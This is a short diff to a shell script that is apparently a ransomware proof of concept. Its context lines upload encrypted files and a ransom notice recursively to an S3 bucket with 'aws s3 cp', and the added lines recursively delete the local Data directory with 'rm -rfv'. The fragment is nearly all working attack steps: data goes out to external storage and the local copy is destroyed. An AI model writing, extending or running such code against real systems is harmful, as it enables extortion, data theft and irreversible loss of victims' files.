@@ -80,6 +80,11 @@ printf "\n[+] Uploading encrypted files and ransom notice...\n"
 sleep 1
 aws s3 cp --recursive ./ s3://platinum-sec-blood-private/poc1/
 printf "\n[*] Encrypted files and ransom notice successfully uploaded!\n"
+
+## Delete locally stored files and directory
+printf "\n[+] Deleting locally store data\n"
+cd ..
+rm -rfv Data
 printf "\n[V] All done!"
 
-cd ..
+
